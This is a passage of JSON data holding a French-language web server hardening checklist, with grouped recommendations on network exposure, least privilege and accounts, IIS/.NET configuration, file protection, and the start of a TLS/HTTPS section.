80/443","desc":"Pour un serveur Web public, limiter le trafic entrant aux ports HTTP/HTTPS réellement nécessaires et protéger séparément les interfaces d’administration."},{"name":"Chiffrer ou restreindre l’intranet","desc":"Les communications avec les backends ou services internes doivent être chiffrées ou limitées par des règles réseau afin qu’une compromission de la zone Web ne donne pas un accès libre à l’intranet."},{"name":"Supprimer services inutiles","desc":"Désactiver les services non nécessaires au rôle Web afin de réduire le nombre de processus exposés et les possibilités d’exploitation."},{"name":"Supprimer modules/extensions inutiles","desc":"Retirer les modules, extensions applicatives, ISAPI filters et autres composants non utilisés pour réduire la surface d’attaque."},{"name":"Supprimer script mappings inutiles","desc":"Les mappings IIS pour extensions ou scripts optionnels doivent être retirés lorsqu’ils ne sont pas nécessaires, afin d’empêcher l’exécution de types de contenu inattendus."},{"name":"Limiter les technologies supportées","desc":"Le serveur ne doit activer que les technologies nécessaires à l’application hébergée. Chaque moteur, runtime ou extension supplémentaire doit avoir une justification."},{"name":"Filtrer les requêtes entrantes","desc":"Appliquer des contrôles sur les requêtes avant traitement afin de bloquer des formats, chemins ou comportements non conformes à l’usage attendu."}]},{"g":"Comptes, privilèges & permissions","items":[{"name":"Désactiver les comptes par défaut inutilisés","desc":"Les comptes créés automatiquement par l’OS ou le serveur doivent être supprimés ou désactivés lorsqu’ils ne sont pas nécessaires."},{"name":"Least Privilege","desc":"Les processus, services, comptes applicatifs et administrateurs doivent disposer uniquement des droits nécessaires à leur fonction. Une compromission a alors un impact plus limité."},{"name":"Limiter administrator/root","desc":"Réduire au minimum le nombre de comptes disposant de privilèges administrateur/root et tenir un suivi des utilisateurs autorisés."},{"name":"Désactiver les comptes non interactifs inutiles","desc":"Les comptes de service qui n’ont pas besoin d’une session interactive ne doivent pas pouvoir ouvrir une session utilisateur."},{"name":"Un compte anonyme par application","desc":"Lorsqu’un serveur héberge plusieurs applications, utiliser des identités séparées afin qu’une application compromise n’hérite pas automatiquement des permissions d’une autre."},{"name":"Permissions NTFS minimales","desc":"Configurer des ACL et permissions NTFS restrictives sur le web root, les fichiers de configuration, logs, metabase et ressources sensibles."},{"name":"Supprimer les partages inutiles","desc":"Désactiver les file shares non nécessaires, y compris les partages administratifs si la politique le permet, et protéger les partages restants avec des permissions restrictives."},{"name":"DB Least Privilege","desc":"Supprimer les comptes et stored procedures inutiles et attribuer au compte utilisé par l’application uniquement les droits nécessaires."},{"name":"Politique de mots de passe forte","desc":"Des mots de passe robustes et une gestion contrôlée ralentissent brute-force, dictionnaire et réutilisation de credentials."},{"name":"Surveiller les échecs de login","desc":"Journaliser et alerter sur les échecs d’authentification répétés pour détecter les attaques de mot de passe."},{"name":"Password Expiry","desc":"Forcer un renouvellement périodique des mots de passe lorsque cette exigence fait partie de la politique appliquée au serveur."},{"name":"Separation of Duties","desc":"Séparer les responsabilités d’administration et de configuration afin qu’une seule identité ne contrôle pas inutilement toutes les fonctions critiques."},{"name":"VPN pour administration multi-serveurs","desc":"Utiliser un VPN sécurisé tel qu’OpenVPN pour l’accès d’administration à plusieurs serveurs plutôt que d’exposer directement toutes les interfaces de gestion."},{"name":"Gestionnaire de mots de passe","desc":"Utiliser un gestionnaire tel que KeePass pour stocker et gérer de manière contrôlée les credentials d’administration."}]},{"g":"Configuration IIS / .NET & fichiers","items":[{"name":"Désactiver tracing & debug","desc":"Désactiver le tracing (`<trace enable=\"false\"/>`) et les compilations debug en production pour éviter de révéler des détails internes ou comportements de diagnostic."},{"name":"HttpForbiddenHandler","desc":"Mapper les ressources qui ne doivent jamais être servies vers un mécanisme de refus tel que HttpForbiddenHandler."},{"name":"Supprimer HttpModules inutiles","desc":"Les modules .NET non utilisés doivent être retirés afin de réduire la surface de traitement des requêtes."},{"name":"IIS — rejeter `../`","desc":"Configurer IIS pour refuser les chemins contenant des séquences de traversal et maintenir le serveur à jour contre les contournements connus."},{"name":"Web root hors partition système","desc":"Placer les sites et virtual directories sur une partition non système afin de réduire l’exposition du système d’exploitation et simplifier les permissions."},{"name":"Protéger .htaccess / web.config","desc":"Les fichiers de configuration Web ne doivent pas être accessibles directement depuis le Web. Ils contiennent souvent des règles, secrets ou paramètres sensibles."},{"name":"Uploaded files hors Web Root","desc":"Analyser les fichiers uploadés contre les malwares et les stocker hors du répertoire directement servi lorsque l’application n’a pas besoin de les exposer tels quels."},{"name":"File Integrity Monitoring","desc":"Utiliser des contrôles d’intégrité pour détecter des modifications non autorisées des fichiers Web, scripts ou configurations."},{"name":"Version Control","desc":"Conserver les fichiers applicatifs dans un système de versionnement permet de suivre les changements et de revenir rapidement à une version connue en cas d’altération."}]},{"g":"TLS, HTTP & WAF","items":[{"name":"Rediriger HTTP vers HTTPS","desc":"Forcer les utilisateurs à passer sur HTTPS réduit l’exposition des sessions et credentials à l’interception e
